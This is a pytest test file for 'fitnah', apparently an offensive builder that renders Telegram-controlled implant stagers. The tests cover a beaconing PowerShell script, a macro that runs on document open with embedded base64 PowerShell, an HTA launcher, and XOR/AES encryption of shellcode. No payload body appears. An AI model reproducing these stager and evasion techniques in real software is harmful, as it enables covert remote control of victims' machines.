"""Phase 7 — Builder pipeline tests (script formats only; exe/shellcode need mingw/donut)."""
import base64

import pytest

from fitnah.builder.engine import BuildEngine
from fitnah.builder.models import Arch, BuildRequest, Encrypt, OutputFormat
from fitnah.builder.encryptor import encrypt_aes_gcm, encrypt_xor, wrap_aes_gcm_c_array, wrap_xor_c_array
from fitnah.builder.stagers import ps1 as ps1_mod
from fitnah.builder.stagers import vba as vba_mod
from fitnah.builder.stagers import hta as hta_mod


TOKEN    = "123456:TESTTOKEN"
CHAT_ID  = "-100999888777"
AGENT_ID = "test-agent-01"


def _req(fmt: OutputFormat, tmp_path, **kwargs) -> BuildRequest:
    return BuildRequest(
        bot_token=TOKEN,
        chat_id=CHAT_ID,
        agent_id=AGENT_ID,
        format=fmt,
        encrypt=Encrypt.NONE,
        output_dir=str(tmp_path),
        **kwargs,
    )


# ── PS1 stager ────────────────────────────────────────────────────────────────

def test_ps1_render_contains_token():
    src = ps1_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20)
    assert TOKEN in src
    assert CHAT_ID in src
    assert AGENT_ID in src


def test_ps1_render_has_checkin():
    src = ps1_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20)
    assert "CHECKIN" in src


def test_ps1_render_has_beacon_loop():
    src = ps1_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20)
    assert "getUpdates" in src
    assert "while" in src


def test_ps1_build_creates_file(tmp_path):
    engine = BuildEngine(tmp_path)
    result = engine.build(_req(OutputFormat.PS1, tmp_path))
    assert result.ok, result.error
    assert result.path.exists()
    assert result.size_bytes > 0
    assert len(result.sha256) == 64


def test_ps1_build_content_correct(tmp_path):
    engine = BuildEngine(tmp_path)
    result = engine.build(_req(OutputFormat.PS1, tmp_path))
    content = result.path.read_text(encoding="utf-8")
    assert TOKEN in content
    assert "getUpdates" in content


# ── VBA stager ────────────────────────────────────────────────────────────────

def test_vba_render_contains_autoopen():
    ps1_src = ps1_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20)
    src     = vba_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20, ps1_src)
    assert "AutoOpen" in src
    assert "Document_Open" in src


def test_vba_render_embeds_base64(tmp_path):
    ps1_src = ps1_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20)
    src     = vba_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20, ps1_src)
    # Base64 of the PS1 must appear split into chunks across the source
    expected_b64 = base64.b64encode(ps1_src.encode("utf-16-le")).decode()
    # VBA stager splits into 100-char chunks; check the first chunk is present
    assert expected_b64[:100] in src


def test_vba_build_creates_file(tmp_path):
    engine = BuildEngine(tmp_path)
    result = engine.build(_req(OutputFormat.VBA, tmp_path))
    assert result.ok, result.error
    assert result.path.exists()


# ── HTA stager ────────────────────────────────────────────────────────────────

def test_hta_render_structure():
    ps1_src = ps1_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20)
    src     = hta_mod.render(TOKEN, CHAT_ID, AGENT_ID, 5, 20, ps1_src)
    assert "<HTA:APPLICATION" in src
    assert "VBScript" in src
    assert "Window_OnLoad" in src


def test_hta_build_creates_file(tmp_path):
    engine = BuildEngine(tmp_path)
    result = engine.build(_req(OutputFormat.HTA, tmp_path))
    assert result.ok, result.error
    assert result.path.exists()


# ── Encryptor ─────────────────────────────────────────────────────────────────

def test_xor_encrypt_decrypt():
    plaintext = b"hello world shellcode\x00\x90\x90"
    key, ct   = encrypt_xor(plaintext)
    decrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(ct))
    assert decrypted == plaintext


def test_xor_ct_differs_from_plaintext():
    pt      = b"AAAAAAAAAA"
    key, ct = encrypt_xor(pt)
    assert ct != pt


def test_xor_c_array_syntax():
    key, ct = encrypt_xor(b"\x90" * 20)
    header  = wrap_xor_c_array(key, ct)
    assert "XOR_KEY" in header
    assert "XOR_CT"  in header
    assert "uint8_t" in header


def test_aes_gcm_roundtrip():
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError:
        pytest.skip("cryptography not installed")
    pt          = b"test shellcode bytes " * 10
    key, nonce, ct = encrypt_aes_gcm(pt)
    recovered   = AESGCM(key).decrypt(nonce, ct, b"")
    assert recovered == pt


def test_aes_c_array_syntax():
    try:
        encrypt_aes_gcm(b"x")
    except RuntimeError:
        pytest.skip("cryptography not installed")
    key, nonce, ct = encrypt_aes_gcm(b"shellcode" * 8)
    header = wrap_aes_gcm_c_array(key, nonce, ct)
    assert "ENC_KEY"   in header
    assert "ENC_NONCE" in header
    assert "ENC_CT"    in header
    assert "uint8_t"   in header


# ── BuildRequest defaults ─────────────────────────────────────────────────────

def test_build_request_auto_name():
    r = BuildRequest(bot_token=TOKEN, chat_id=CHAT_ID, agent_id=AGENT_ID,
                     format=OutputFormat.PS1)
    assert r.output_name.startswith("fitnah_test-agent-01_")
    assert r.output_name.endswith(".ps1")


def test_build_request_custom_name():
    r = BuildRequest(bot_token=TOKEN, chat_id=CHAT_ID, agent_id=AGENT_ID,
                     format=OutputFormat.EXE, output_name="custom.exe")
    assert r.output_name == "custom.exe"


# ── Unknown format guard ──────────────────────────────────────────────────────

def test_build_unknown_format(tmp_path):
    engine = BuildEngine(tmp_path)
    req = BuildRequest(bot_token=TOKEN, chat_id=CHAT_ID, agent_id=AGENT_ID,
                       format=OutputFormat.PS1, output_dir=str(tmp_path))
    # Patch format to something invalid after construction
    req.format = "badformat"  # type: ignore
    result = engine.build(req)
    assert not result.ok
    assert "Unknown format" in result.error
